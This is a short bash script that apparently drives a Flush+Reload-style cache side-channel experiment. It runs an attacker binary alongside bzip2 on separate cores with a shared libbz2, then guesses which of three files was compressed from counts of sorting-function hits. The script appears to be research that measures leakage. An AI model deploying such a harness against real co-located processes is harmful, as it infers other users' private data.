#!/bin/bash
make

filenames=("alice29.txt" "quickfox" "sample3.tst")
filenames_size=${#filenames[@]}
scores=(0 0 0)
max_scores=(0 0 0)
nr_iteration=1000

for i in `seq $nr_iteration`; do
	echo "============================="
	index=$(($RANDOM % $filenames_size))
	filename=${filenames[$index]}
	echo iteration $i, $filename
	
	LD_PRELOAD=../bzip2-1.0.6/libbz2.so.1.0.6 taskset -c 1 timeout 5s ./FRattacker > tmpfile.txt &
	sleep 1
	
	LD_PRELOAD=../bzip2-1.0.6/libbz2.so.1.0.6 taskset -c 5 bzip2 -kf files/$filename
	wait
	ms=$(cat tmpfile.txt | grep mainSort_cnt | cut -d '=' -f 2)
	fs=$(cat tmpfile.txt | grep fallbackSort_cnt | cut -d '=' -f 2)
	echo mainsort $ms
	echo fallbacksort $fs
	classification="none"

	if (( $ms < 20 )); then 
		classification="quickfox"
	else
		if (( $ms > 750 )); then
			classification="alice29.txt"
		else
			classification="sample3.tst"
		fi
	fi

	echo correct file: $filename, classified file: $classification
	if [[ $classification == $filename ]]; then
		echo yay!
		(( scores[$index] ++ ))
	fi
	(( max_scores[$index] ++ ))
done

echo scores per file are ${scores[@]} - max scores are ${max_scores[@]}
